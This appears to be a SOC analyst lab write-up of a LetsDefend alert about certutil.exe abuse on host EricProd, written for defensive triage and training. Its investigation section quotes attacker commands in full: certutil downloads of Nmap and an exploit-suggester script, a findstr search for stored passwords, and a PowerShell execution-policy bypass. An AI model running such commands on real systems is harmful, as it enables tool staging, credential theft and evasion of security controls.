# SOC163 - Suspicious Certutil.exe Usage


## Executive Summary

On March 1, 2022, the Security Operations Center (SOC) received an alert for suspicious usage of `certutil.exe` on the host **EricProd** (172.16.17.22). The investigation confirmed this was the beginning of a deliberate, multi-stage post-exploitation sequence. The attacker, having already gained access to the host, used `certutil.exe` as a "Living-off-the-Land" binary (LOLBin) to download multiple hacking and reconnaissance tools, including **Nmap** and the **Windows-Exploit-Suggester** script. Endpoint logs show the attacker then executed these tools, performed network reconnaissance (`arp -a`), and attempted to find hardcoded passwords (`findstr /si pass *.txt`). The attacker also prepared for further script execution by bypassing PowerShell's execution policy. The `EDR Action: Allowed` confirms the entire chain was successful. The host is fully compromised and being actively used for reconnaissance and privilege escalation.

## Incident Details

The initial alert was triggered by the malicious use of a legitimate Windows utility for downloading files:

<img width="1339" height="587" alt="image" src="https://github.com/user-attachments/assets/73f9d23c-dffc-4288-b9df-6cb101704cae" />

| | |
| :--- | :--- |
| **Date of Incident**| March 1, 2022 |
| **Source Host**| EricProd (172.16.17.22) |
| **Tool Used**| `certutil.exe` (LOLBin) |
| **Downloaded Tools**| Nmap, Windows-Exploit-Suggester |
| **Attack Type**| Post-Exploitation / Living-off-the-Land |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/113))* |

## Investigation and Analysis

### 1. Alert Context: `certutil.exe` as a LOLBin

The rule `SOC163 - Suspicious Certutil.exe Usage` is designed to detect the malicious use of a legitimate Windows binary.
*   **Legitimate Use:** `Certutil.exe` is a command-line program for managing digital certificates in Windows.
*   **Malicious Use (T1105 - Ingress Tool Transfer):** Attackers abuse `certutil.exe` with the `-urlcache -split -f` parameters to download files from a remote URL. Because `certutil.exe` is a trusted, Microsoft-signed binary, this activity is less likely to be blocked by basic application whitelisting than a direct `powershell.exe` download, making it a stealthy way to bring tools onto a compromised host.

### 2. Deconstructing the Attack Chain via Endpoint Logs

The EDR's command-line history provides a clear, step-by-step narrative of the attacker's post-exploitation activities.

**Stage 1: Downloading the Attacker Toolkit**
The attacker used `certutil.exe` twice to download their tools.
1.  **Nmap (Network Scanner):**
    *   **Command:** `certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip`
    *   **Purpose:** The attacker downloaded Nmap, a powerful network scanner, to perform reconnaissance on the internal network, discover live hosts, and identify open ports and services.
    <img width="1080" height="314" alt="image" src="https://github.com/user-attachments/assets/bd7fd5e8-d3d9-4c5d-b104-5c7c470cfff6" />

2.  **Windows-Exploit-Suggester (Privilege Escalation Tool):**
    *   **Command:** `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py`
    *   **Purpose:** This Python script is a popular tool that compares a system's patch level against a database of known vulnerabilities to find missing patches that could be exploited for local privilege escalation. This is a clear indicator that the attacker is trying to elevate from a standard user to Administrator or SYSTEM.
    <img width="927" height="251" alt="image" src="https://github.com/user-attachments/assets/828d4d31-1135-4898-ae57-2a5c70e131a5" />

**Stage 2: Reconnaissance and Preparation**
After downloading their tools, the attacker began executing commands.
<img width="1326" height="290" alt="image" src="https://github.com/user-attachments/assets/48defb89-ce8f-4482-b3b9-4e0a39229dd2" />
1.  **Execute Exploit Suggester:** `python check.py` - The attacker ran the script they just downloaded to find a path to escalate their privileges.
2.  **Network Discovery:** `arp -a` - The attacker ran the `arp` command to view the local ARP cache, which gives them a list of other IP addresses on the same subnet that the host has recently communicated with.
3.  **Credential Hunting:** `findstr /si pass *.txt | *.xml| *.ini` - This command recursively searches (`/si`) through all `.txt`, `.xml`, and `.ini` files for the string "pass" (as in, password). This is an automated way to find credentials that might be carelessly stored in configuration files or text documents.
4.  **Evasion/Preparation:** `C:/powershell.exe -nop -exec bypass` - The attacker ran this command to start a PowerShell session with the `-ExecutionPolicy Bypass` flag. This disables security controls that prevent the execution of unsigned PowerShell scripts, setting the stage for them to run more complex malicious scripts later.

### 3. Confirmation of Success

The `EDR Action: Allowed` status in the initial alert, combined with the sequence of commands seen in the endpoint logs, confirms that the entire attack chain was successful. The attacker was not blocked at any stage.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR
*   **Skills Demonstrated:** LOLBin Analysis (Certutil), Post-Exploitation Triage, TTP Recognition (Reconnaissance, Credential Hunting, Privilege Escalation), Windows and PowerShell Command Line Analysis, Attack Chain Reconstruction.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** It is a deliberate, multi-stage post-exploitation sequence.
*   **What Is The Attack Type?** **Post-Exploitation / Living-off-the-Land.**
*   **Was the Attack Successful?** **Yes.** The attacker successfully downloaded and executed multiple hacking tools and commands.
*   **Do You Need Tier 2 Escalation?** **Yes.** An active, hands-on attacker on an endpoint is a critical incident.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC163 was a **true positive** that provided a window into an active, hands-on-keyboard attack. The host **EricProd** is fully compromised. An attacker, having already gained initial access, is actively performing reconnaissance and attempting to escalate privileges with the clear intent of moving deeper into the network.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the host **EricProd** (172.16.17.22) from the network to evict the active attacker and prevent them from completing their privilege escalation or moving laterally.
2.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team for a live response investigation.
3.  **INVESTIGATION:** The primary goals for the IR team are:
    *   To determine the initial access vector. *How* did the attacker get the initial access to run these commands?
    *   To analyze the output of the attacker's commands. Did `windows-exploit-suggester.py` find a vulnerability? Did `findstr` discover any passwords?
    *   To analyze all network traffic from the host to hunt for signs of a C2 channel.
4.  **CREDENTIALS - Assume Compromise:** The user's credentials must be considered compromised. The password for the user on `EricProd` and any other accounts they have access to must be reset immediately.
5.  **RECOVERY:** The compromised host must be wiped and re-imaged from a known-good source.
6.  **BLOCK INDICATORS:** Block the hashes of the downloaded tools at the EDR level. Block the domains/IPs used for the download (`nmap.org`, `raw.githubusercontent.com`) at the web proxy if they are not required for business, or create more specific rules to alert on downloads of tools from these sites.











